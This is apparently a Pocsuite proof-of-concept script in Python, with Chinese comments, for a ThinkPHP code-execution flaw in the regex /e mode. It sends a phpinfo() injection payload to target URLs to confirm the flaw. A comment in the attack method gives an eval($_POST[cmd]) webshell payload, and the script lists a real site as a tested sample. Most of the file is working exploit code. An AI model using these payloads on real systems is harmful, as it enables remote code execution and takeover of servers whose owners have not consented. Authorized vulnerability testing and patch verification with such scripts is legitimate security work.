#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
See the file 'docs/COPYING' for copying permission
"""
#命令行
from pocsuite import pocsuite_cli
#验证模块
from pocsuite import pocsuite_verify
#攻击模块
from pocsuite import pocsuite_attack
#控制台模式
from pocsuite import pocsuite_console
from pocsuite.api.request import req 
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase

class ThinkphpPOC(POCBase):
    vulID = '4'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1' #默认为1
    vulDate = '2017-03-01' #漏洞公开的时间,不知道就写今天

    author = 'ly55521' #  PoC作者的大名
    createDate = '2017-03-01'# 编写 PoC 的日期
    updateDate = '2017-03-01'# PoC 更新的时间,默认和编写时间一样
    references = 'http://0535code.com/'# 漏洞地址来源,0day不用写
    name = 'Thinkphp Command execution'# PoC 名称
    appPowerLink = 'http://www.thinkphp.cn/'# 漏洞厂商主页地址
    appName = 'Thinkphp'# 漏洞应用名称
    appVersion = 'Thinkphp 0.0-3.1 Lite'# 漏洞影响版本
    vulType = 'code-exec'#漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        Thinkphp正则-e模式代码执行漏洞
    ''' # 漏洞简要描述
    samples = ["http://down.51cto.com/data/283085","/examples/Blog/index.php"]# 测试样列,就是用 PoC 测试成功的网站
    install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"严重" #严重,高危,中危,低危

    #验证漏洞 pocsuite -r 4-thinkphp-getshell.py -u 10.1.5.26 --verify
    def _verify(self):
        #定义返回结果
        result = {}
        #获取漏洞url
        import urlparse
        vul_url = urlparse.urlparse(self.url).scheme + "://" + urlparse.urlparse(self.url).netloc
        send_payload = "/index.php/module/aciton/param1/${@phpinfo()}"
        url = vul_url + send_payload
        #print url

        try:
            r = req.get(url=url, timeout=5,allow_redirects=False) #禁止重定向
            if r.status_code == 200 and "<title>phpinfo()</title>" in r.text:
                #print u"存在漏洞"
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = vul_url
                result['VerifyInfo']['Payload'] = send_payload
            else:
                result = {}

        except Exception,e:
            #print "error!"
            result = {}
        print '[+]4 poc done'
        return self.save_output(result)

    #漏洞攻击
    def _attack(self):
        result = {}
        # 攻击代码
        # /index.php/module/action/param1/{${eval($_POST[cmd])}}
        return self._verify()

    def save_output(self, result):
        #判断有无结果并输出
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output

register(ThinkphpPOC)

